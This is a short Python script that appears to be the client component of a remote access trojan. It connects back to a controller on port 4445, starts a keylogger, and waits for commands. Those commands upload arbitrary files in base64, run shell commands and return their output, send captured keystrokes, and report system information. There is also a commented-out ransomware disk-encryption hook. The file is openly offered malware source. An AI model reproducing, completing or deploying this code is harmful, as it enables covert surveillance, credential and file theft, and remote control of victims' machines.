## socket code
from __future__ import absolute_import
import threading
import socket
import json
#from ransom.crypt import crypt
from sysinfo.info import get_sys_info
import base64
import os
import subprocess
import threading
from keylogger import KeyLogger

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(('127.0.0.1', 4445))
connection.send(bytes(socket.gethostname(), encoding='utf-8'))

keylogger = KeyLogger()
thread = threading.Thread(target=keylogger.run)
thread.run()
print('Keylogger has successfully started')

while True:
    # <command> <args>
    command = str(connection.recv(1024), encoding='utf-8').split(' ')

    # crypt_disk [<path>]
    if command[0] == 'crypt_disk':
        try:
            #crypt(command[1] if len(command) > 1 else os.path.dirname(os.path.realpath(__file__)))
            connection.send(json.dumps({'status': 'OK'}))
        except:
            connection.send(json.dumps({'status': 'ERROR'}))
    elif command[0] == 'sysinfo':
        connection.send(json.dumps({
            'status': 'OK',
            'data': get_sys_info()
        }))
    # download <path>
    elif command[0] == 'download':
        try:
            with open(command[1], 'rb') as file:
                connection.send(json.dumps({
                    'status': 'OK',
                    'data': base64.b64encode(file.read())
                }))
        except:
            connection.send(json.dumps({'status': 'ERROR'}))

    elif command[0] == 'exit':
      connection.close()
      break
    elif command[0] == 'shell':
        command.pop(0)
        try:
            result = subprocess.run(command, stdout=subprocess.PIPE)
            connection.send(json.dumps({'status': 'OK', 'data': str(result.stdout)}))
        except:
            connection.send((json.dumps({'status': 'ERROR'})))
    elif command[0] == 'keys':
        connection.send(bytes(json.dumps({'status': 'OK', 'data': keylogger.log}), encoding='utf-8'))
        keylogger.log = ''
    else:
        connection.send(json.dumps({'status': 'ERROR', 'data': 'unrecognized command'}))
